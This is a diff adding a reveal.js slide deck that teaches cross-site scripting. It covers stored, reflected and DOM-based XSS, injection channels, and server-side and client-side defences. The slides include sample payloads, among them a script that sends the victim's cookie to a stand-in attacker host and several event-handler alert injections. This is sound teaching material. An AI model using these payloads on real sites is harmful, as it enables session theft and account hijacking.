@@ -1,0 +1,223 @@
+<!doctype html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+		<title>Cross-site scripting</title>
+
+		<link rel="stylesheet" href="dist/reset.css">
+		<link rel="stylesheet" href="dist/reveal.css">
+		<link rel="stylesheet" href="dist/theme/moon.css" id="theme">
+
+		<!-- Theme used for syntax highlighted code -->
+		<link rel="stylesheet" href="plugin/highlight/monokai.css">
+	</head>
+	<body>
+		<div class="reveal">
+			<div class="slides">
+				<!--1st slide-->
+				<section>
+					<img src="./dist/assets/logo.jpg" alt="XSS">
+				</section>
+
+				<!--2nd slide-->
+				<section>
+					<h2>Overview</h2>
+					<img src="./dist/assets/cross-site-scripting-example.png" alt="scheme">
+				</section>
+
+				<!--3rd slide-->
+				<section>
+					<h3>Types of XSS</h3>
+					<h4>Stored</h4>
+					<h4>Reflected</h4>
+					<h4>DOM Based</h4>
+				</section>
+
+				<!--4th slide-->
+				<section>
+					<h4>Stored XSS (AKA Persistent or Type I)</h4>
+					<img style="margin: 0;" src="./dist/assets/StoredXSS.png" alt="stored">
+					<span style="font-size: 20px; margin-top: 0; display: block;">Snippet of the key stealing code with the session ID:</span>
+					<pre style="margin: 0;">
+<code style="font-size: 16px;">
+	&lt;script&gt;
+		document.location="http://attackerhost.example/cgi-bin/cookiesteal.cgi?"+document.cookie
+	&lt;/script&gt;
+</code>
+					</pre>
+				</section>
+
+				<!--5th slide-->
+				<section>
+					<h4>Reflected XSS (AKA Non-Persistent or Type II)</h4>
+					<img src="./dist/assets/reflectedXSS.png" alt="Reflected" style="width: 80%; margin: 0;">
+					<span style="display: block; font-size: 20px;">If the site does not escape the angle brackets, converting them to "& lt;" and "& gt;", we get the <b><em>script</em></b> on the search results page.</span>
+					<pre>
+<code style="font-size: 20px;">
+	http://example.com/search.php?q=&lt;script&gt;DoSomething();&lt;/script&gt;
+</code>
+					</pre>
+				</section>
+
+				<!--6th slide-->
+				<section>
+					<h4>DOM Based XSS (AKA Type-0)</h4>
+					<img src="./dist/assets/dom.png" alt="DOM" style="width: 60%; margin: 0;">
+					<span style="display: block; font-size: 20px;">The source (where malicious data is read) could be the URL of the page (e.g., document.location.href), or it could be an element of the HTML, and the sink is a sensitive method call that causes the execution of the malicious data (e.g., document.write):</span>
+					<pre  style="margin: 0;">
+<code style="font-size: 20px;">
+	&lt;body&gt;
+		&lt;script&gt;document.write(location.href);&lt;/script&gt;
+	&lt;/body&gt;
+</code>
+					</pre>
+				</section>
+
+				<!--7th slide-->
+				<section>
+					<h3>BY SCRIPT INJECTION CHANNELS</h3>
+					<h4>Browser errors</h4>
+					<h4>No escaping HTML special characters</h4>
+					<h4>Lack of filtering of attributes and their values in allowed tags</h4>
+					<h4>Changing the encoding in the page header</h4>
+					<h4>Through SQL injection</h4>
+				</section>
+
+				<!--8th slide-->
+				<section>
+					<h3>Browser errors</h3>
+					<span>Bugzilla, 2004. In some browsers (at least Internet Explorer) when specifying a URL:</span>
+					<pre>
+						<code>
+http://bugzilla.mozilla.org/enter_bug.cgi?
+&lt;script&gt;alert('foo');&lt;/script&gt;
+						</code>
+					</pre>
+					<span>no URL encoding occurs and the code</span>
+					<pre>
+						<code>
+document.write("&lt;p&gt;URL: " + document.location + &lt;/p&gt;");
+						</code>
+					</pre>
+					<span>will embed a script into the page.</span>
+				</section>
+
+				<!--9th slide-->
+				<section>
+					<h3>No escaping HTML special characters</h3>
+					<p>characters need to be escaped: " ' & &lt; &gt; </p>
+					<span>phpBB, 2002. Although the URL of the images is checked for the protocol (only http: is allowed), the URL itself is not escaped in any way, and with a string like</span>
+					<pre>
+						<code>
+[img]http://a.a/a"onerror="javascript:alert(document.cookie)[/img]
+						</code>
+					</pre>
+					<span>you can drag a custom script into the document.</span>
+				</section>
+
+				<!--10th slide-->
+				<section>
+					<h3>Lack of filtering of attributes and their values in allowed tags</h3>
+					<span>A typical example would be the link:</span>
+					<pre>
+						<code>
+							&lt;a href="javascript:DoSomething()"&gt;. 
+						</code>
+					</pre>
+					<span>Even if the forum allows external links, don't let the protocols go <b>javascript:</b> and <b>data:</b></span>
+				</section>
+
+				<!--11th slide-->
+				<section>
+					<h3>Changing the encoding in the page header</h3>
+					<span>In case the tag &lt;title&gt; located before the tag &lt;meta&gt; and is filled with user data</span>
+					<pre>
+						<code>
+&lt;title&gt;Title&lt;/title&gt;
+&lt;meta [...user data]&gt;
+						</code>
+					</pre>
+					<span>a hacker can insert malicious html code in UTF-7 encoding, thus bypassing the filtering of characters such as &lt; and " </span>
+				</section>
+
+				<!--12th slide-->
+				<section>
+					<h3>Through SQL injection</h3>
+					<img src="./dist/assets/sql.jpg" alt="sql">
+				</section>
+
+				<!--13th slide-->
+				<section>
+					<h3>BY WAY OF EXPOSURE</h3>
+					<h4>Active</h4>
+					<p style="font-size: 20px;">An active XSS attack does not require any action on the part of the user in terms of the functionality of the web application.</p>
+					<pre>
+						<code>
+&lt;input type=text value=a onfocus=alert(1337) AUTOFOCUS&gt;
+						</code>
+					</pre>
+					<h4>Passive (autonomous)</h4>
+					<p style="font-size: 20px;">A passive XSS attack is triggered when the user performs a specific action (click or hover the mouse pointer, etc.).</p>
+					<pre>
+						<code>
+&lt;a href='a' onmouseover=alert(1337) style='font-size:500px'&gt;
+						</code>
+					</pre>
+				</section>
+
+				<!--14th slide-->
+				<section>
+					<h3>MEANS OF PROTECTION</h3>
+					<h4>Server side protection</h4>
+					<h4>Client side protection</h4>
+				</section>
+
+				<!--14th slide-->
+				<section>
+					<h3>Server side protection</h3>
+					<ul style="font-size: 28px;">
+						<li>Encode control HTML, JavaScript, CSS, and URL before displaying in a browser. The following functions can be used to filter input parameters: filter_sanitize_encoded (for URL encoding), htmlentities (for HTML filtering) </li>
+						<li>Input data encoding. For example, using the libraries OWASP Encoding Project, HTML Purifier, htmLawed, Anti-XSS Class.Regular manual and automated code security analysis and penetration testing. Using tools like Nessus, Nikto Web Scanner and OWASP Zed Attack Proxy.</li>
+						<li>Specifying the encoding on each web page (for example, ISO-8859-1 or UTF-8) before any custom fields</li>
+						<li>Ensuring the security of cookies, which can be implemented by restricting the domain and path for accepted cookies, setting the HttpOnly parameter, using SSL.</li>
+						<li>Using the Content Security Policy header, which allows you to specify a list in which the desired sources are entered from which various data can be loaded, for example, JS, CSS, images, etc.</li>
+					</ul>
+				</section>
+
+				<!--15th slide-->
+				<section>
+					<h3>Client side protection</h3>
+					<ul style="font-size: 28px;">
+						<li>Regular update of the browser to the new version</li>
+						<li>Install browser extensions that will validate form fields, URLs, JavaScript, and POST requests, and if scripts are encountered, apply XSS filters to prevent them from running. Examples of such extensions: NoScript for FireFox, NotScripts for Chrome and Opera.</li>
+					</ul>
+				</section>
+
+				<!--15th slide-->
+				<section>
+					<h2>thank you for attention!</h2>
+				</section>
+
+
+			</div>
+		</div>
+
+		<script src="dist/reveal.js"></script>
+		<script src="plugin/notes/notes.js"></script>
+		<script src="plugin/markdown/markdown.js"></script>
+		<script src="plugin/highlight/highlight.js"></script>
+		<script>
+			// More info about initialization & config:
+			// - https://revealjs.com/initialization/
+			// - https://revealjs.com/config/
+			Reveal.initialize({
+				hash: true,
+
+				// Learn about plugins: https://revealjs.com/plugins/
+				plugins: [ RevealMarkdown, RevealHighlight, RevealNotes ]
+			});
+		</script>
+	</body>
+</html>
